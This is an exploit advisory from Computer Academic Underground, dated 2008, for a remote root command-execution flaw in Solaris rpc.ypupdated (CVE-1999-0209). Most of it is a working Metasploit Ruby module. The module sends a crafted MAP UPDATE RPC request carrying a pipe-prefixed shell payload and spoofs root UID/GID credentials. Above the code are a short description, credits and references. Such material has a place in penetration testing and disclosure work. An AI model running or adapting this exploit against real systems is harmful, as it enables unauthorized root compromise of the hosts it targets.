Sun Solaris <= 10 rpc.ypupdated Remote Root Exploit (meta)
==========================================================

                      ____      ____     __    __
                     /    \    /    \   |  |  |  |
        ----====####/  /\__\##/  /\  \##|  |##|  |####====----
                   |  |      |  |__|  | |  |  |  |
                   |  |  ___ |   __   | |  |  |  |
  ------======######\  \/  /#|  |##|  |#|  |##|  |######======------
                     \____/  |__|  |__|  \______/
                                                     
                    Computer Academic Underground
                        http://www.caughq.org
                            Exploit Code

===============/========================================================
Exploit ID:     CAU-EX-2008-0001
Release Date:   2008.04.04
Title:          ypupdated_exec.rb
Description:    Solaris ypupdated Command Execution
Tested:         Solaris x86/sparc 10, sparc 9, 8, 2.7
Attributes:     Remote, NULL Auth, Elevated Privileges, Metasploit
Exploit URL:    http://www.caughq.org/exploits/CAU-EX-2008-0001.txt
Author/Email:   I)ruid <druid (@) caughq.org>
===============/========================================================

Description
===========

This exploit targets a weakness in the way the ypupdated RPC application
uses the command shell when handling a MAP UPDATE request.  Extra
commands may be launched through this command shell, which runs as root
on the remote host, by passing commands in the format &#039;|<command>&#039;.


Credits
=======

Josh D. <mcpheea@cadvision.com> from Avalon Security Research is
credited with originally discovering this vulnerability.

This Metasploit exploit module was modeled after kcope&#039;s exploit
released to Milw0rm on 2008.03.20.


References
==========

http://osvdb.org/displayvuln.php?osvdb_id=11517
http://cve.mitre.org/cgi-bin/cvename.cgi?name=1999-0209
http://www.securityfocus.com/bid/1749/info
http://www.milw0rm.com/exploits/5282


Metasploit
==========

require &#039;msf/core&#039;

module Msf

class Exploits::Solaris::Sunrpc::YPUpdateDExec < Msf::Exploit::Remote

	include Exploit::Remote::SunRPC

	def initialize(info = {})
		super(update_info(info,	
			&#039;Name&#039;           => &#039;Solaris ypupdated Command Execution&#039;,
			&#039;Description&#039;    => %q{
				This exploit targets a weakness in the way the ypupdated RPC
				application uses the command shell when handling a MAP UPDATE
				request.  Extra commands may be launched through this command
				shell, which runs as root on the remote host, by passing
				commands in the format &#039;|<command>&#039;.

				Vulnerable systems include Solaris 2.7, 8, 9, and 10, when
				ypupdated is started with the &#039;-i&#039; command-line option.
			},
			&#039;Author&#039;         => [ &#039;I)ruid <druid@caughq.org>&#039; ],
			&#039;License&#039;        => MSF_LICENSE,
			&#039;Version&#039;        => &#039;$Revision: 4498 $&#039;,
			&#039;References&#039;     =>
				[
					[&#039;BID&#039;, &#039;1749&#039;],
					[&#039;CVE&#039;, &#039;1999-0209&#039;],
					[&#039;OSVDB&#039;, &#039;11517&#039;],
				],
			&#039;Privileged&#039;     => true,
			&#039;Platform&#039;       => [&#039;unix&#039;, &#039;solaris&#039;],
			&#039;Arch&#039;           => ARCH_CMD,
			&#039;Payload&#039;        =>
				{
					&#039;Space&#039;    => 1024,
					&#039;DisableNops&#039; => true,
				},
			&#039;Targets&#039;        => [ [&#039;Automatic&#039;, { }], ],
			&#039;DefaultTarget&#039; => 0
		))

		register_options(
			[
				OptString.new(&#039;HOSTNAME&#039;, [false, &#039;Remote hostname&#039;, &#039;localhost&#039;]),
				OptInt.new(&#039;GID&#039;, [false, &#039;GID to emulate&#039;, 0]),
				OptInt.new(&#039;UID&#039;, [false, &#039;UID to emulate&#039;, 0])
			], self.class
		)
	end

	def exploit
		hostname  = datastore[&#039;HOSTNAME&#039;]
		program   = 100028
		progver   = 1
		procedure = 1

		print_status &#039;Sending PortMap request for ypupdated program&#039;
		pport = sunrpc_create(&#039;udp&#039;, program, progver)

		print_status "Sending MAP UPDATE request with command &#039;#{payload.encoded}&#039;"
		print_status &#039;Waiting for response...&#039;
		sunrpc_authunix(hostname, datastore[&#039;UID&#039;], datastore[&#039;GID&#039;], [])
		command = &#039;|&#039; + payload.encoded
		msg = XDR.encode(command, 2, 0x78000000, 2, 0x78000000)
		sunrpc_call(procedure, msg)

		sunrpc_destroy

		print_good &#039;No Errors, appears to have succeeded!&#039;
	rescue ::Rex::Proto::SunRPC::RPCTimeout
		print_status &#039;Warning: &#039; + $!
		print_status &#039;Exploit may or may not have succeeded.&#039;
	end

end
end	


